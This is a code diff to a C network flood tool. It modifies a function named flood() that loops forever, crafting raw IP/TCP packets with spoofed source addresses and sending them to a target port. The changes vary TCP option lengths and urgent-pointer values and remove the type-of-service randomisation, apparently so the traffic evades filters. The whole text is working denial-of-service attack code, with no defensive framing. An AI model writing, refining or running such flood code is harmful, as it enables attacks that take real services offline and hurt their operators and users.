@@ -203,9 +203,12 @@ void *flood(void *par1)
 	init_rand(time(NULL));
 	register unsigned int i;
 	i = 0;
+	char optLens[5] = {0x80, 0x75, 0x70, 0x85, 0x90};
+	int urgPtrs[3] = {6025, 20504, 44377};
 	while (1)
 	{
 
+		opts->length = optLens[randnum(0, 4)];
 		uint8_t first_octet_options[16] = {151, 188, 37, 51, 176, 5, 92, 172, 8, 198, 192, 155, 140, 144, 55, 132};
 		uint8_t second_octet_options[16] = {80, 165, 187, 89, 31, 196, 222, 64, 46, 41, 112, 155, 1, 170, 32, 128};
 		uint8_t third_octet_options[8] = {1, randnum(1, 255), 255, 113, 8, 36, 128, 192};
@@ -225,7 +228,7 @@ void *flood(void *par1)
 		iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpopts) + randomPayloadLength - 1;
 		iph->check = csum((unsigned short *)datagram, iph->tot_len);
 		tcph->check = 0;
-		tcph->urg_ptr = htons(rand_cmwc() & 0xFFFF);
+		tcph->urg_ptr = htons(urgPtrs[randnum(0, 2)]);
 		tcph->seq = htonl(rand_cmwc() & 0xFFFFFFFFF);
 		tcph->ack_seq = randnum(10000, 99999);
 		tcph->dest = htons(floodport);
@@ -243,8 +246,6 @@ void *flood(void *par1)
 		}
 
 		int windows[3] = {8192, 64240, 65535};
-		int ctos[3] = {0, 40, 72};
-		iph->tos = ctos[randnum(0, 2)];
 		tcph->window = htons(windows[randnum(0, 2)]);
 		pps++;
 		if (i >= limiter)
